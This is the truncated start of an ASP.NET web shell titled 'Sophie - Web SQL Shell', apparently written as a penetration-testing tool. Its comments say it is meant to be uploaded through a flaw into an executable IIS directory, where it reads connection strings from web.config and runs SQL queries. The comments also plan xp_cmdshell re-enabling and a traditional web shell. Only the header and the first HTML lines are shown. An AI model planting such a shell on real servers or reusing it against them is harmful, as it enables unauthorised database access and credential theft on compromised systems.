<%
' If you can exploit a flaw to upload files to an executable directory in an IIS environment,
' this script parses web.config for connection strings and allows you to execute SQL queries
' Author: Jerome Smith @exploresecurity
' Version: 0.2
' http://www.7safe.com
' http://www.exploresecurity.com
' Licence: free to modify and then distribute if you retain original credits, otherwise grateful if you refer to original download link, thank you
' To do:	auto xp_cmdshell detection and re-enabling if possible
'			information_schema viewer / simplified query tool to save all that typing
'			add traditional web shell
%>
<% @ Page Language="VB" %>
<% Response.Buffer=True %>
<html>
<head><title>Sophie - Web SQL Shell</title></head>
<body>
<form action="sophie.aspx" method="POST">
